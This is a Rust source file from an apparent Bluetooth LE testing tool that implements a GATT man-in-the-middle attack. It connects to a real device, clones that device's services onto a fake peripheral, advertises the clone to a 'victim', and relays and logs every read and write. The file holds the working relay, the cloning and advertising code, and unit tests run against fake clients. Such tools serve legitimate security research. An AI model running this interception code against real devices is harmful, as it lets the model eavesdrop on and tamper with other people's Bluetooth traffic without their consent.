//! GATT MITM: act as central to the real device and present a cloned
//! peripheral to the victim, relaying + logging every GATT read/write.
//! Absorbs GATTacker/BtleJuice/Mirage-MITM without external tools.
//!
//! The relay logic below (`MitmRelay`) is pure and radio-free: it takes any
//! `GattClient` (fake or real) as the device side and records the exchange.
//! The clone/serve half (building a peripheral with bluster and driving it
//! alongside a central to the real device) is Linux-only and needs 2 adapters
//! + peripheral mode — see the `live` module.

use crate::error::BleError;
use crate::radio::{GattClient, WriteError};

/// Direction of one relayed exchange, from the victim's point of view.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RelayOp {
    /// Victim wrote `bytes` to `uuid`; forwarded to the real device.
    Write,
    /// Victim read `uuid`; `bytes` is the real device's value, forwarded back.
    Read,
}

/// One relayed GATT exchange, in order (`seq` is a monotonic sequence number,
/// not a wall-clock timestamp, so logs stay deterministic under test).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MitmLogEntry {
    pub seq: u64,
    pub op: RelayOp,
    pub uuid: String,
    pub bytes: Vec<u8>,
}

/// Relays victim GATT requests to the real device and logs every exchange.
/// No radio: driven in tests by a `GattClient` fake (the device side); in the
/// live path the device side is a real central connection (see `live::serve`).
#[derive(Debug, Default)]
pub struct MitmRelay {
    log: Vec<MitmLogEntry>,
    seq: u64,
}

impl MitmRelay {
    pub fn new() -> Self {
        Self::default()
    }

    /// Everything relayed so far, in order.
    pub fn log(&self) -> &[MitmLogEntry] {
        &self.log
    }

    fn next_seq(&mut self) -> u64 {
        let s = self.seq;
        self.seq += 1;
        s
    }

    /// Forward a victim write of `data` to `uuid` on the real `device`, log
    /// it, and return the device's response (its own error, unmasked by the
    /// MITM) to the victim.
    pub async fn relay_write<C: GattClient>(
        &mut self,
        device: &C,
        uuid: &str,
        data: &[u8],
    ) -> Result<(), WriteError> {
        let result = device.write(uuid, data).await;
        let seq = self.next_seq();
        self.log.push(MitmLogEntry {
            seq,
            op: RelayOp::Write,
            uuid: uuid.to_string(),
            bytes: data.to_vec(),
        });
        result
    }

    /// Forward a victim read of `uuid` to the real `device`, log the value
    /// returned, and hand it back to the victim.
    pub async fn relay_read<C: GattClient>(
        &mut self,
        device: &C,
        uuid: &str,
    ) -> Result<Vec<u8>, BleError> {
        let value = device.read(uuid).await?;
        let seq = self.next_seq();
        self.log.push(MitmLogEntry {
            seq,
            op: RelayOp::Read,
            uuid: uuid.to_string(),
            bytes: value.clone(),
        });
        Ok(value)
    }
}

/// Live clone/serve path: build a peripheral mirroring the target's GATT
/// (via bluster) and drive it alongside a central connection to the real
/// device. Needs Linux + 2 adapters + peripheral mode (bluster is Linux-only,
/// see Cargo.toml); gated by `capability::require(Feature::Mitm)` plus an
/// adapter-count check, never run on macOS/Windows or with one adapter.
#[cfg(target_os = "linux")]
pub mod live {
    use super::MitmRelay;
    use crate::capability::{self, Feature, Platform, Support};
    use crate::gatt::GattService;
    use crate::radio::GattClient;
    use crate::report::sanitize;
    use bluster::gatt::{
        characteristic::{Characteristic, Properties as CharProperties, Read, Secure, Write},
        descriptor::{Descriptor, Properties as DescProperties},
        event::{Event, Response},
        service::Service,
    };
    use futures::channel::mpsc;
    use futures::stream::{self, StreamExt};
    use std::collections::HashSet;
    use std::time::Duration;
    use uuid::Uuid;

    /// Backlog per characteristic event channel before bluster/D-Bus blocks on us.
    const EVENT_CHANNEL_CAPACITY: usize = 32;
    const SCAN_TIMEOUT: Duration = Duration::from_secs(5);

    /// Check the static (feature x platform) verdict, then the live hardware
    /// precondition (>=2 adapters). Returns the remediation text to print on
    /// failure; `Ok(())` means the live MITM may proceed.
    pub async fn require_mitm() -> Result<(), String> {
        match capability::support(Feature::Mitm, Platform::current()) {
            Support::Unsupported => {
                return Err(format!(
                    "{:?} unsupported on {:?}",
                    Feature::Mitm,
                    Platform::current()
                ))
            }
            Support::NeedsCapability(_) | Support::Supported => {}
        }
        let count = adapter_count().await.map_err(|e| e.to_string())?;
        if count < 2 {
            return Err(format!(
                "mitm needs a second adapter + peripheral mode (found {count} adapter(s))"
            ));
        }
        Ok(())
    }

    async fn adapter_count() -> Result<usize, crate::error::BleError> {
        use btleplug::api::Manager as _;
        let manager = btleplug::platform::Manager::new().await.map_err(|e| {
            crate::error::BleError::OsError {
                context: e.to_string(),
            }
        })?;
        let adapters = manager
            .adapters()
            .await
            .map_err(|e| crate::error::BleError::OsError {
                context: e.to_string(),
            })?;
        Ok(adapters.len())
    }

    /// One bluster characteristic's event channel, tagged with its UUID so the
    /// relay loop knows which characteristic an `Event` belongs to.
    struct CharChannel {
        uuid: String,
        rx: mpsc::Receiver<Event>,
    }

    /// `ch.properties` -> bluster `Properties`, every readable/writable/notify/
    /// indicate capability forwarding its events down the same channel (one
    /// consumer per characteristic drives reads, writes and subscribes alike).
    fn char_properties(props: &[String], tx: mpsc::Sender<Event>) -> CharProperties {
        let has = |name: &str| props.iter().any(|p| p.eq_ignore_ascii_case(name));
        let read = has("read").then(|| Read(Secure::Insecure(tx.clone())));
        let write = if has("write") {
            Some(Write::WithResponse(Secure::Insecure(tx.clone())))
        } else if has("write-without-response") {
            Some(Write::WithoutResponse(tx.clone()))
        } else {
            None
        };
        let notify = has("notify").then(|| tx.clone());
        let indicate = has("indicate").then(|| tx.clone());
        CharProperties::new(read, write, notify, indicate)
    }

    /// Build bluster GATT services that mirror `target_services`, one bluster
    /// `Characteristic`/`Descriptor` per enumerated one, each wired to a fresh
    /// event channel. Pure/no-D-Bus: bluster only touches D-Bus from
    /// `Peripheral::new`/`register_gatt`/`start_advertising`, never from these
    /// constructors, so this is deterministic and safe to unit-test without
    /// hardware. A service/characteristic/descriptor whose UUID bluster's
    /// `Uuid` (0.8) can't parse is dropped, mirroring `extract_gatt_fields`
    /// dropping empty UUIDs.
    // bluster's API requires HashSet<Characteristic/Descriptor> (hash = uuid only).
    #[allow(clippy::mutable_key_type)]
    fn clone_gatt_tree(
        target_services: &[GattService],
    ) -> (Vec<Service>, Vec<Uuid>, Vec<CharChannel>) {
        let mut services = Vec::new();
        let mut service_uuids = Vec::new();
        let mut channels = Vec::new();
        for svc in target_services {
            let Ok(svc_uuid) = Uuid::parse_str(&svc.uuid) else {
                continue;
            };
            let mut chars = HashSet::new();
            for ch in &svc.characteristics {
                let Ok(ch_uuid) = Uuid::parse_str(&ch.uuid) else {
                    continue;
                };
                let (tx, rx) = mpsc::channel(EVENT_CHANNEL_CAPACITY);
                let descriptors = ch
                    .descriptors
                    .iter()
                    .flatten()
                    .filter_map(|d| Uuid::parse_str(&d.uuid).ok())
                    .map(|u| Descriptor::new(u, DescProperties::new(None, None), None))
                    .collect();
                chars.insert(Characteristic::new(
                    ch_uuid,
                    char_properties(&ch.properties, tx),
                    None,
                    descriptors,
                ));
                channels.push(CharChannel {
                    uuid: ch.uuid.clone(),
                    rx,
                });
            }
            service_uuids.push(svc_uuid);
            services.push(Service::new(svc_uuid, true, chars));
        }
        (services, service_uuids, channels)
    }

    /// Answer one bluster GATT event by relaying it to the real `device` and
    /// logging the exchange via `relay`. Takes a `GattClient` rather than a
    /// concrete transport so it is unit-tested against `testkit::FakeClient`.
    /// Every relay error degrades to `Response::UnlikelyError` (bluster/BlueZ
    /// don't let us forward the original ATT error code back to the victim).
    /// `NotifySubscribe`/`NotifyUnsubscribe` are accepted but not forwarded:
    /// relaying the real device's live notifications needs `GattClient` to
    /// support subscribing too, which is out of scope here (see module docs;
    /// #68 covers the live two-adapter relay).
    async fn handle_event<C: GattClient>(
        uuid: &str,
        event: Event,
        device: &C,
        relay: &mut MitmRelay,
    ) {
        match event {
            Event::ReadRequest(req) => {
                let resp = match relay.relay_read(device, uuid).await {
                    Ok(bytes) => Response::Success(bytes),
                    Err(_) => Response::UnlikelyError,
                };
                let _ = req.response.send(resp);
            }
            Event::WriteRequest(req) => {
                let resp = match relay.relay_write(device, uuid, &req.data).await {
                    Ok(()) => Response::Success(Vec::new()),
                    Err(_) => Response::UnlikelyError,
                };
                let _ = req.response.send(resp);
            }
            Event::NotifySubscribe(_) | Event::NotifyUnsubscribe => {}
        }
    }

    /// Drive every characteristic's event channel against `device`, relaying
    /// and logging each read/write, until all channels close (peripheral torn
    /// down).
    async fn relay_loop<C: GattClient>(
        channels: Vec<CharChannel>,
        device: &C,
        relay: &mut MitmRelay,
    ) {
        // `.boxed()` erases each closure's distinct type so `select_all` sees
        // one homogeneous stream type (every per-characteristic `.map` closure
        // is otherwise its own anonymous type).
        let mut merged = stream::select_all(channels.into_iter().map(|c| {
            let uuid = c.uuid;
            c.rx.map(move |ev| (uuid.clone(), ev)).boxed()
        }));
        while let Some((uuid, event)) = merged.next().await {
            handle_event(&uuid, event, device, relay).await;
        }
    }

    /// Clone the target's GATT onto a bluster peripheral, advertise it, and
    /// relay every read/write the victim sends it to the real device (logging
    /// each exchange via `MitmRelay`) until interrupted (Ctrl-C).
    ///
    /// This is the peripheral/clone half of #20: a victim write is forwarded
    /// to the real device and logged. Forwarding the real device's own
    /// notifications/indications into the victim's subscription is NOT
    /// implemented (needs `GattClient::subscribe`, which does not exist yet)
    /// and live validation against two real adapters is #68 — this code
    /// cannot be exercised without hardware, so only the GATT-tree
    /// construction and the relay/event-handling logic are unit-tested here.
    pub async fn serve(
        adapter: Option<&str>,
        target: &str,
        _allow_dangerous: bool,
    ) -> Result<(), String> {
        require_mitm().await?;
        use crate::radio::{connect_client, select_target_device, BtleplugCentral, Central};

        let devices = BtleplugCentral
            .scan(SCAN_TIMEOUT)
            .await
            .map_err(|e| e.to_string())?;
        let dev = select_target_device(&devices, target)
            .map_err(|e| e.to_string())?
            .clone();
        let client = connect_client(adapter, &dev, SCAN_TIMEOUT)
            .await
            .map_err(|e| e.to_string())?;
        let services = client.services().await.map_err(|e| e.to_string())?;
        let display_name = sanitize(
            dev.adv_local_name
                .as_deref()
                .or(dev.name.as_deref())
                .unwrap_or("ble-doctor-clone"),
        );
        eprintln!(
            "mitm: cloning '{display_name}' ({} service(s))",
            services.len()
        );

        let (bluster_services, service_uuids, channels) = clone_gatt_tree(&services);
        let peripheral = bluster::Peripheral::new()
            .await
            .map_err(|e| format!("mitm: peripheral init failed: {e}"))?;
        for svc in &bluster_services {
            peripheral
                .add_service(svc)
                .map_err(|e| format!("mitm: add_service failed: {e}"))?;
        }
        peripheral
            .register_gatt()
            .await
            .map_err(|e| format!("mitm: register_gatt failed: {e}"))?;
        peripheral
            .start_advertising(&display_name, &service_uuids)
            .await
            .map_err(|e| format!("mitm: start_advertising failed: {e}"))?;

        let mut relay = MitmRelay::new();
        tokio::select! {
            _ = relay_loop(channels, &client, &mut relay) => {}
            _ = tokio::signal::ctrl_c() => {}
        }

        let _ = peripheral.stop_advertising().await;
        let _ = peripheral.unregister_gatt().await;
        eprintln!("mitm: relayed {} exchange(s)", relay.log().len());
        Ok(())
    }

    #[cfg(test)]
    mod tests {
        use super::*;
        use crate::gatt::{GattChar, GattDescriptor};
        use crate::testkit::{FakeClient, FakeGattTree, WriteOutcome};
        use futures::channel::oneshot;
        use futures::SinkExt;

        fn services(uuid: &str, char_uuid: &str, props: &[&str]) -> Vec<GattService> {
            vec![GattService {
                uuid: uuid.into(),
                characteristics: vec![GattChar {
                    uuid: char_uuid.into(),
                    properties: props.iter().map(|p| p.to_string()).collect(),
                    description: None,
                    descriptors: Some(vec![GattDescriptor {
                        uuid: "00002902-0000-1000-8000-00805f9b34fb".into(),
                    }]),
                }],
            }]
        }

        const SVC: &str = "0000180d-0000-1000-8000-00805f9b34fb";
        const CHR: &str = "00002a39-0000-1000-8000-00805f9b34fb";

        #[test]
        fn clone_gatt_tree_builds_one_service_and_channel_per_char() {
            let (svcs, svc_uuids, channels) =
                clone_gatt_tree(&services(SVC, CHR, &["read", "write", "notify"]));
            assert_eq!(svcs.len(), 1);
            assert_eq!(svc_uuids, vec![Uuid::parse_str(SVC).unwrap()]);
            assert_eq!(channels.len(), 1);
            assert_eq!(channels[0].uuid, CHR);
        }

        #[test]
        fn clone_gatt_tree_drops_unparseable_uuids() {
            let (svcs, svc_uuids, channels) =
                clone_gatt_tree(&services("not-a-uuid", CHR, &["read"]));
            assert!(svcs.is_empty() && svc_uuids.is_empty() && channels.is_empty());
            let (svcs, _, channels) = clone_gatt_tree(&services(SVC, "garbage", &["read"]));
            assert_eq!(svcs.len(), 1);
            assert!(channels.is_empty());
        }

        #[tokio::test]
        async fn read_event_relays_to_device_and_logs() {
            let device = FakeClient::new(FakeGattTree::new()).script_read(CHR, &[7, 7]);
            let mut relay = MitmRelay::new();
            let (resp_tx, resp_rx) = oneshot::channel();
            handle_event(
                CHR,
                Event::ReadRequest(bluster::gatt::event::ReadRequest {
                    offset: 0,
                    response: resp_tx,
                }),
                &device,
                &mut relay,
            )
            .await;
            match resp_rx.await.unwrap() {
                Response::Success(bytes) => assert_eq!(bytes, vec![7, 7]),
                other => panic!("unexpected response: {other:?}"),
            }
            assert_eq!(relay.log().len(), 1);
        }

        #[tokio::test]
        async fn write_event_relays_to_device_and_logs() {
            let device =
                FakeClient::new(FakeGattTree::new()).script_write(CHR, WriteOutcome::Accept);
            let mut relay = MitmRelay::new();
            let (resp_tx, resp_rx) = oneshot::channel();
            handle_event(
                CHR,
                Event::WriteRequest(bluster::gatt::event::WriteRequest {
                    data: vec![1, 2, 3],
                    offset: 0,
                    without_response: false,
                    response: resp_tx,
                }),
                &device,
                &mut relay,
            )
            .await;
            assert!(matches!(resp_rx.await.unwrap(), Response::Success(b) if b.is_empty()));
            assert_eq!(device.writes(), vec![(CHR.to_string(), vec![1, 2, 3])]);
            assert_eq!(relay.log().len(), 1);
        }

        #[tokio::test]
        async fn failed_relay_answers_unlikely_error() {
            let device = FakeClient::new(FakeGattTree::new()); // no scripted read for CHR
            let mut relay = MitmRelay::new();
            let (resp_tx, resp_rx) = oneshot::channel();
            handle_event(
                CHR,
                Event::ReadRequest(bluster::gatt::event::ReadRequest {
                    offset: 0,
                    response: resp_tx,
                }),
                &device,
                &mut relay,
            )
            .await;
            assert!(matches!(resp_rx.await.unwrap(), Response::UnlikelyError));
            assert!(relay.log().is_empty());
        }

        #[tokio::test]
        async fn relay_loop_drains_multiple_channels_then_returns() {
            let device = FakeClient::new(FakeGattTree::new())
                .script_read("c1", &[1])
                .script_write("c2", WriteOutcome::Accept);
            let mut relay = MitmRelay::new();
            let (mut tx1, rx1) = mpsc::channel(1);
            let (mut tx2, rx2) = mpsc::channel(1);
            let (r1_tx, r1_rx) = oneshot::channel();
            let (r2_tx, r2_rx) = oneshot::channel();
            tx1.send(Event::ReadRequest(bluster::gatt::event::ReadRequest {
                offset: 0,
                response: r1_tx,
            }))
            .await
            .unwrap();
            tx2.send(Event::WriteRequest(bluster::gatt::event::WriteRequest {
                data: vec![9],
                offset: 0,
                without_response: true,
                response: r2_tx,
            }))
            .await
            .unwrap();
            drop(tx1);
            drop(tx2);
            let channels = vec![
                CharChannel {
                    uuid: "c1".into(),
                    rx: rx1,
                },
                CharChannel {
                    uuid: "c2".into(),
                    rx: rx2,
                },
            ];
            relay_loop(channels, &device, &mut relay).await;
            assert!(matches!(r1_rx.await.unwrap(), Response::Success(b) if b == vec![1]));
            assert!(matches!(r2_rx.await.unwrap(), Response::Success(b) if b.is_empty()));
            assert_eq!(relay.log().len(), 2);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testkit::{FakeClient, FakeGattTree, WriteOutcome};

    #[tokio::test]
    async fn victim_write_is_forwarded_and_logged() {
        let device = FakeClient::new(FakeGattTree::new()).script_write("c1", WriteOutcome::Accept);
        let mut relay = MitmRelay::new();
        relay.relay_write(&device, "c1", &[1, 2, 3]).await.unwrap();
        assert_eq!(device.writes(), vec![("c1".to_string(), vec![1, 2, 3])]);
        assert_eq!(
            relay.log(),
            [MitmLogEntry {
                seq: 0,
                op: RelayOp::Write,
                uuid: "c1".into(),
                bytes: vec![1, 2, 3],
            }]
        );
    }

    #[tokio::test]
    async fn victim_read_returns_devices_value_and_is_logged() {
        let device = FakeClient::new(FakeGattTree::new()).script_read("c2", &[9, 9]);
        let mut relay = MitmRelay::new();
        let got = relay.relay_read(&device, "c2").await.unwrap();
        assert_eq!(got, vec![9, 9]);
        assert_eq!(
            relay.log(),
            [MitmLogEntry {
                seq: 0,
                op: RelayOp::Read,
                uuid: "c2".into(),
                bytes: vec![9, 9],
            }]
        );
    }

    #[tokio::test]
    async fn sequence_increments_across_mixed_exchanges() {
        let device = FakeClient::new(FakeGattTree::new())
            .script_write("w", WriteOutcome::Accept)
            .script_read("r", &[5]);
        let mut relay = MitmRelay::new();
        relay.relay_write(&device, "w", &[1]).await.unwrap();
        relay.relay_read(&device, "r").await.unwrap();
        let seqs: Vec<u64> = relay.log().iter().map(|e| e.seq).collect();
        assert_eq!(seqs, vec![0, 1]);
    }

    #[test]
    fn capability_gate_matches_current_platform() {
        use crate::capability::{self, Feature, Platform, Support};
        let verdict = capability::support(Feature::Mitm, Platform::current());
        if cfg!(target_os = "linux") {
            assert_eq!(
                verdict,
                Support::NeedsCapability("second adapter + peripheral mode")
            );
        } else {
            assert_eq!(verdict, Support::Unsupported);
        }
    }
}
